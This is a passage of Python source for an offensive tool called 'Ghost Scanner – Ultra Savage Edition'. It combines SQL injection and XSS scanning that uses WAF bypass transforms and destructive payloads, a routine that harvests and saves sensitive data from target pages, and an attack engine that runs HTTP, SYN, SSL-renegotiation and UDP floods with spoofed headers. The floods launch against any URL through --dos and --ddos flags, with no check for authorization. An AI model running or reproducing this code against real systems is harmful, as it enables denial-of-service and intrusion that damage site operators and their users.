        for param, value in params.items():
            parsed = urlparse(target)
            query = parsed.query
            if query:
                new_query = query.replace(f"{param}={value}", f"{param}={quote(value)}")
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            else:
                url = f"{target}?{param}={quote(value)}"
            resp = self._smart_request(url, timeout=3)
            if resp:
                self._baseline_lengths[param] = len(resp.text)

        # Generate 10k payloads, sample 200 for speed
        all_payloads = self._generate_sqli_payloads(10000)
        # Prioritize high-confidence payloads
        high_prio = [p for p in all_payloads if any(x in p for x in ['SLEEP','UNION','EXTRACTVALUE','BENCHMARK','WAITFOR','DROP','DELETE'])]
        low_prio = [p for p in all_payloads if p not in high_prio]
        # Shuffle and limit to 200 total
        random.shuffle(low_prio)
        selected = high_prio[:50] + low_prio[:150]
        # Apply WAF bypass techniques (only few to save time)
        final_payloads = []
        for p in selected:
            for technique in self.waf_bypass_techniques[:4]:
                try:
                    processed = technique(p)
                    if len(processed) < 300 and processed not in final_payloads:
                        final_payloads.append(processed)
                except:
                    pass
        random.shuffle(final_payloads)
        final_payloads = final_payloads[:200]

        total = len(params) * len(final_payloads)
        if total == 0:
            return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), TimeRemainingColumn(), console=console) as progress:
            task = progress.add_task("[red]SQL Injection", total=total)
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for param, value in params.items():
                    for payload in final_payloads:
                        futures.append(executor.submit(self._check_sql, target, param, value, payload))
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        results.append(res)
                    progress.update(task, advance=1)
        return results

    # ========== XSS SCAN with 10k payloads ==========
    def _check_xss(self, target, param, original_value, payload):
        try:
            parsed = urlparse(target)
            query = parsed.query
            if query:
                new_query = query.replace(f"{param}={original_value}", f"{param}={quote(payload)}")
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            else:
                url = f"{target}?{param}={quote(payload)}"
            resp = self._smart_request(url, timeout=4)
            if not resp:
                return None
            if payload in resp.text:
                return {"type": "XSS (Reflected)", "param": param, "payload": payload[:100],
                        "evidence": "Payload reflected", "risk": "HIGH", "confidence": 90}
        except:
            pass
        return None

    def _scan_xss(self, target, params):
        results = []
        all_payloads = self._generate_xss_payloads(10000)
        high_prio = [p for p in all_payloads if '<script>' in p or 'onerror' in p or 'javascript:' in p]
        low_prio = [p for p in all_payloads if p not in high_prio]
        random.shuffle(low_prio)
        selected = high_prio[:50] + low_prio[:150]
        final_payloads = []
        for p in selected:
            for technique in self.waf_bypass_techniques[:4]:
                try:
                    processed = technique(p)
                    if len(processed) < 200 and processed not in final_payloads:
                        final_payloads.append(processed)
                except:
                    pass
        random.shuffle(final_payloads)
        final_payloads = final_payloads[:200]

        total = len(params) * len(final_payloads)
        if total == 0:
            return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), TimeRemainingColumn(), console=console) as progress:
            task = progress.add_task("[magenta]XSS", total=total)
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for param, value in params.items():
                    for payload in final_payloads:
                        futures.append(executor.submit(self._check_xss, target, param, value, payload))
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        results.append(res)
                    progress.update(task, advance=1)
        return results

    # ========== SAVE SENSITIVE DATA ==========
    def _save_sensitive_data(self, all_sensitive):
        combined = {}
        for sens_dict in all_sensitive:
            for key, values in sens_dict.items():
                if not combined.get(key):
                    combined[key] = []
                combined[key].extend(values)
        timestamp = int(time.time())
        for key, values in combined.items():
            if values:
                unique_vals = list(set(values))
                filename = f"{self.sensitive_folder}/{key}_{timestamp}.txt"
                with open(filename, 'w') as f:
                    f.write('\n'.join(unique_vals))
                console = Console()
                console.print(f"[green]Saved {len(unique_vals)} {key} to {filename}")
                self.results_scan["sensitive_data"][key] = unique_vals[:20]

    # ========== MAIN SCAN ==========
    def run_scan(self, target):
        self.results_scan["target"] = target
        self.results_scan["domain"] = urlparse(target).netloc
        self.results_scan["timestamp"] = datetime.now().isoformat()
        start_time = time.time()
        console = Console()
        console.print(Panel(f"[bold red]Starting Ghost Scan on {target}[/bold red]", border_style="red"))

        # Access target
        resp = None
        for attempt in range(3):
            try:
                if attempt == 0:
                    resp = self._smart_request(target, timeout=8)
                elif attempt == 1:
                    resp = self.session.get(target, timeout=8, allow_redirects=True)
                else:
                    resp = self.scraper.get(target, timeout=8)
                if resp and resp.status_code < 400:
                    break
            except:
                pass
        if not resp:
            console.print("[red]Failed to access target![/red]")
            return

        html = resp.text

        # Parameters extraction
        all_params = {}
        all_params.update(self._extract_params_from_url(target))
        forms = self._extract_forms(html, target)
        for form in forms:
            if form['method'] == 'GET':
                for input_name in form['inputs']:
                    all_params[input_name] = '1'
        api_urls = self._extract_api_endpoints(html, target)
        for api_url in api_urls:
            for common in self.common_params:
                all_params[common] = '1'
        if not all_params:
            for common in self.common_params[:30]:
                all_params[common] = '1'
        param_items = list(all_params.items())
        if len(param_items) > 100:
            random.shuffle(param_items)
            param_items = param_items[:100]
        scan_params = dict(param_items)
        console.print(f"[green]Found {len(scan_params)} parameters to test.[/green]")

        # Ports
        domain = self.results_scan["domain"]
        open_ports = self._scan_ports(domain)
        self.results_scan["ports"] = open_ports
        if open_ports:
            console.print(f"[green]Open ports: {', '.join(map(str, open_ports))}[/green]")

        # Sensitive data
        all_sensitive = [self._extract_sensitive_data(html)]
        for api_url in api_urls[:5]:
            resp_api = self._smart_request(api_url, timeout=4)
            if resp_api:
                all_sensitive.append(self._extract_sensitive_data(resp_api.text))

        # === NEW MODULES ===
        console.print("[yellow]Checking Business Logic Errors...[/yellow]")
        biz_findings = self._check_business_logic(target, scan_params)
        console.print("[yellow]Checking Improper Input Validation...[/yellow]")
        input_findings = self._check_improper_input(target, scan_params)
        console.print("[yellow]Checking Mass Assignment...[/yellow]")
        mass_findings = self._check_mass_assignment(target, scan_params)
        console.print("[yellow]Testing Rate Limit...[/yellow]")
        rate_findings = self._check_rate_limit(target)

        # === SQL & XSS ===
        console.print("[yellow]Scanning SQL Injection (10k payloads)...[/yellow]")
        sql_results = self._scan_sql(target, scan_params)
        console.print("[yellow]Scanning XSS (10k payloads)...[/yellow]")
        xss_results = self._scan_xss(target, scan_params)

        self._save_sensitive_data(all_sensitive)

        # Combine all findings
        all_findings = sql_results + xss_results + biz_findings + input_findings + mass_findings + rate_findings
        self.results_scan["vulnerabilities"]["sql_injection"] = sql_results
        self.results_scan["vulnerabilities"]["xss"] = xss_results
        self.results_scan["vulnerabilities"]["business_logic"] = biz_findings
        self.results_scan["vulnerabilities"]["improper_input_validation"] = input_findings
        self.results_scan["vulnerabilities"]["mass_assignment"] = mass_findings
        self.results_scan["vulnerabilities"]["rate_limit"] = rate_findings

        total_vulns = len(all_findings)
        self.results_scan["summary"]["total"] = total_vulns
        self.results_scan["summary"]["critical"] = len([f for f in all_findings if f.get('risk') == 'CRITICAL'])
        self.results_scan["summary"]["high"] = len([f for f in all_findings if f.get('risk') == 'HIGH'])
        self.results_scan["summary"]["medium"] = len([f for f in all_findings if f.get('risk') == 'MEDIUM'])
        self.results_scan["summary"]["low"] = len([f for f in all_findings if f.get('risk') == 'LOW'])

        self.results_scan["scan_duration"] = time.time() - start_time
        self.results_scan["validated"] = True

        console.print(f"[bold green]Scan completed in {self.results_scan['scan_duration']:.2f}s.[/bold green]")
        console.print(f"[bold yellow]Found {total_vulns} vulnerabilities.[/bold yellow]")
        if open_ports:
            console.print(f"[bold cyan]Open ports: {', '.join(map(str, open_ports))}[/bold cyan]")

        # Display findings
        self._display_findings(all_findings)

        # Save reports
        json_file = f"{self.result_folder}/scan_{int(time.time())}.json"
        with open(json_file, 'w') as f:
            json.dump(self.results_scan, f, indent=2)
        console.print(f"[green]JSON results saved to {json_file}[/green]")
        self._generate_html_report(json_file)

    def _display_findings(self, findings):
        console = Console()
        if not findings:
            console.print("[green]No vulnerabilities found.[/green]")
            return
        table = Table(title="Vulnerability Findings", box=box.ROUNDED)
        table.add_column("Type", style="cyan")
        table.add_column("Parameter", style="yellow")
        table.add_column("Payload", style="magenta")
        table.add_column("Evidence", style="white")
        table.add_column("Risk", style="red")
        table.add_column("Confidence", style="green")
        for f in findings[:20]:
            table.add_row(
                f.get('type', 'Unknown')[:30],
                f.get('param', 'N/A')[:20],
                f.get('payload', 'N/A')[:30],
                f.get('evidence', 'N/A')[:40],
                f.get('risk', 'INFO'),
                f"{f.get('confidence', 0)}%"
            )
        console.print(table)

    def _generate_html_report(self, json_file):
        html = f"""<html><head><title>Ghost Scanner Report</title>
        <style>body{{font-family:Arial;}} .critical{{color:red;}}</style></head><body>
        <h1>Ghost Scanner – Ultra Savage Edition</h1>
        <p>Target: {self.results_scan['target']}</p>
        <p>Timestamp: {self.results_scan['timestamp']}</p>
        <h2>Vulnerabilities</h2><ul>"""
        for vtype, vulns in self.results_scan["vulnerabilities"].items():
            if vulns:
                html += f"<li><b>{vtype}</b> ({len(vulns)})</li>"
                for v in vulns[:5]:
                    html += f"<ul><li>{v.get('param')} - {v.get('payload')[:50]} (Confidence: {v.get('confidence', 0)}%)</li></ul>"
        html += "</ul><h2>Sensitive Data</h2><ul>"
        for k, vals in self.results_scan["sensitive_data"].items():
            if vals:
                html += f"<li>{k}: {', '.join(vals[:3])}</li>"
        html += f"</ul><h2>Open Ports</h2><ul>"
        for p in self.results_scan["ports"]:
            html += f"<li>{p}</li>"
        html += "</ul></body></html>"
        html_file = json_file.replace('.json', '.html')
        with open(html_file, 'w') as f:
            f.write(html)
        console = Console()
        console.print(f"[green]HTML report saved to {html_file}[/green]")

# ========== ATTACK ENGINE ==========
class AttackEngine:
    def __init__(self, target, threads=200, duration=30, method='http'):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.method = method
        self.running = False
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
        )
        self.ua = UserAgent()

    def start(self):
        console = Console()
        console.print(f"[red]Starting {self.method.upper()} attack on {self.target}[/red]")
        console.print(f"[yellow]Threads: {self.threads}, Duration: {self.duration}s[/yellow]")
        self.running = True
        if self.method == 'http':
            self._http_flood()
        elif self.method == 'syn':
            self._syn_flood()
        elif self.method == 'ssl':
            self._ssl_reneg()
        elif self.method == 'udp':
            self._udp_flood()
        elif self.method == 'all':
            self._http_flood()
            self._syn_flood()
            self._ssl_reneg()
            self._udp_flood()
        time.sleep(self.duration)
        self.running = False
        console.print("[green]Attack stopped.[/green]")

    def _http_flood(self):
        success = 0
        fail = 0
        lock = threading.Lock()
        def worker():
            nonlocal success, fail
            while self.running:
                try:
                    headers = {
                        'User-Agent': self.ua.random,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    }
                    methods = ['get', 'post', 'head']
                    chosen = random.choice(methods)
                    if chosen == 'get':
                        resp = self.scraper.get(self.target, headers=headers, timeout=3)
                    elif chosen == 'post':
                        resp = self.scraper.post(self.target, headers=headers, data={"x": "A"*1024}, timeout=3)
                    else:
                        resp = self.scraper.head(self.target, headers=headers, timeout=3)
                    with lock:
                        success += 1
                        if success % 100 == 0:
                            console = Console()
                            console.print(f"[green]HTTP Flood: Success {success}, Fail {fail}[/green]")
                except:
                    with lock:
                        fail += 1
                time.sleep(random.uniform(0.01, 0.05))
        for _ in range(self.threads):
            threading.Thread(target=worker, daemon=True).start()

    def _syn_flood(self):
        success = 0
        fail = 0
        lock = threading.Lock()
        def worker():
            nonlocal success, fail
            while self.running:
                try:
                    domain = self.target.replace('https://', '').replace('http://', '').split('/')[0]
                    ip = socket.gethostbyname(domain)
                    port = random.choice([80, 443, 8080, 8443])
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((ip, port))
                    sock.send(b"SYN" * 1024 + b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                    sock.close()
                    with lock:
                        success += 1
                        if success % 100 == 0:
                            console = Console()
                            console.print(f"[cyan]SYN Flood: Success {success}, Fail {fail}[/cyan]")
                except:
                    with lock:
                        fail += 1
                time.sleep(random.uniform(0.01, 0.03))
        for _ in range(self.threads):
            threading.Thread(target=worker, daemon=True).start()

    def _ssl_reneg(self):
        success = 0
        fail = 0
        lock = threading.Lock()
        def worker():
            nonlocal success, fail
            while self.running:
                try:
                    domain = self.target.replace('https://', '').replace('http://', '').split('/')[0]
                    context = ssl.create_default_context()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((domain, 443))
                    ssl_sock = context.wrap_socket(sock, server_hostname=domain)
                    ssl_sock.send(b"R" * 4096)
                    ssl_sock.close()
                    with lock:
                        success += 1
                        if success % 100 == 0:
                            console = Console()
                            console.print(f"[magenta]SSL Reneg: Success {success}, Fail {fail}[/magenta]")
                except:
                    with lock:
                        fail += 1
                time.sleep(random.uniform(0.05, 0.1))
        for _ in range(self.threads):
            threading.Thread(target=worker, daemon=True).start()

    def _udp_flood(self):
        success = 0
        fail = 0
        lock = threading.Lock()
        def worker():
            nonlocal success, fail
            while self.running:
                try:
                    domain = self.target.replace('https://', '').replace('http://', '').split('/')[0]
                    ip = socket.gethostbyname(domain)
                    port = random.choice([53, 123, 161, 137, 138, 139, 445, 500, 1701, 4500, 5060, 5061])
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    data = b"UDP Flood" * 1024
                    sock.sendto(data, (ip, port))
                    with lock:
                        success += 1
                        if success % 100 == 0:
                            console = Console()
                            console.print(f"[yellow]UDP Flood: Success {success}, Fail {fail}[/yellow]")
                except:
                    with lock:
                        fail += 1
                time.sleep(random.uniform(0.001, 0.01))
        for _ in range(self.threads):
            threading.Thread(target=worker, daemon=True).start()

# ========== LOADING ANIMATION ==========
def loading_animation():
    console = Console()
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                  transient=True, console=console) as progress:
        task = progress.add_task("[cyan]Initializing Ghost Scanner...", total=None)
        time.sleep(1)
        progress.update(task, description="[green]Loading payloads...")
        time.sleep(0.8)
        progress.update(task, description="[yellow]Setting up proxies...")
        time.sleep(0.8)
        progress.update(task, description="[magenta]Preparing attack modules...")
        time.sleep(0.8)
        progress.update(task, description="[bold cyan]Ready to scan!", total=100)
        time.sleep(0.5)

# ========== MAIN ==========
def main():
    if '-h' in sys.argv or '--help' in sys.argv:
        show_help()

    parser = argparse.ArgumentParser(description="Ghost Scanner – Ultimate Security Tool", add_help=False)
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-o', '--output', help='Output JSON file', default='results.json')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--proxy-list', help='Proxy file (one per line)')
    parser.add_argument('--validate-proxy', action='store_true', help='Validate proxies before use')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxies')
    parser.add_argument('--quick', action='store_true', help='Quick scan (fewer payloads)')
    parser.add_argument('--dos', action='store_true', help='Launch HTTP flood attack')
    parser.add_argument('--ddos', action='store_true', help='Multi-method attack (HTTP+SYN+SSL+UDP)')
    parser.add_argument('--syn', action='store_true', help='Launch SYN flood attack')
    parser.add_argument('--ssl-reneg', action='store_true', help='Launch SSL renegotiation attack')
    parser.add_argument('--udp', action='store_true', help='Launch UDP flood attack')
    parser.add_argument('--threads', type=int, default=200, help='Threads for attack (default 200)')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds (default 30)')
    parser.add_argument('--scan', action='store_true', help='Run vulnerability scan (default if no attack flag)')
    args = parser.parse_args()

    clear_screen()
    show_banner()

    if not args.url:
        args.url = input("Enter target URL (https://): ").strip()
        if not args.url:
            print("No target provided. Exiting.")
            sys.exit(1)

    loading_animation()
    clear_screen()
    show_banner()

    attack_flags = [args.dos, args.ddos, args.syn, args.ssl_reneg, args.udp]
    if any(attack_flags):
        method = 'http'
        if args.ddos:
            method = 'all'
        elif args.syn:
            method = 'syn'
        elif args.ssl_reneg:
            method = 'ssl'
        elif args.udp:
            method = 'udp'
        attack = AttackEngine(args.url, threads=args.threads, duration=args.duration, method=method)
        attack.start()
    else:
        scanner = GhostScanner(target=args.url, use_proxy=not args.no_proxy,
                               proxy_file=args.proxy_list, validate_proxy=args.validate_proxy,
                               quick=args.quick)
        try:
            scanner.run_scan(args.url)
        except KeyboardInterrupt:
            console = Console()
            console.print("[red]Scan interrupted by user.[/red]")

if __name__ == "__main__":
    main()